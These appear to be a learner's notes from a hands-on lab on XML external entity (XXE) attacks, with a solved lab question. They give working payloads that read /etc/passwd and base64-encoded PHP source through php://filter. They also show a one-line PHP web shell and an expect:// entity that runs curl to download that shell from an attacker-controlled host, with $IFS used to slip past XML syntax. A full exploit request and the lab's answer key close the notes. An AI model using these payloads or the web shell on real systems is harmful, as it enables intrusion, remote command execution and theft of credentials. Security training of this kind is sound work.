# Local File Disclosure
## Identifying
The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. We should note which elements are being displayed, such that we know which elements to inject into.

## Reading Sensitive Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
    <email>
        &company;
    </email>
</root>
```

## Reading source code
If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format.

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

## Remote Code Execution with XXE
The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands.

```
$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
$ sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> **Note:** We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.

## Questions
1. Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer. **Answer: UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg**
   - Combine XXE attack with PHP filter wrapper to read local file:
        ```
        POST /submitDetails.php HTTP/1.1
        Host: 10.129.234.170
        Content-Length: 246
        Accept-Language: en-US,en;q=0.9
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Content-Type: text/plain;charset=UTF-8
        Accept: */*
        Origin: http://10.129.234.170
        Referer: http://10.129.234.170/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE email [
        <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
        ]>
        <root>
        <name>1</name>
        <tel>123</tel>
        <email>&company;</email>
        <message>124124</message>
        </root>
        ```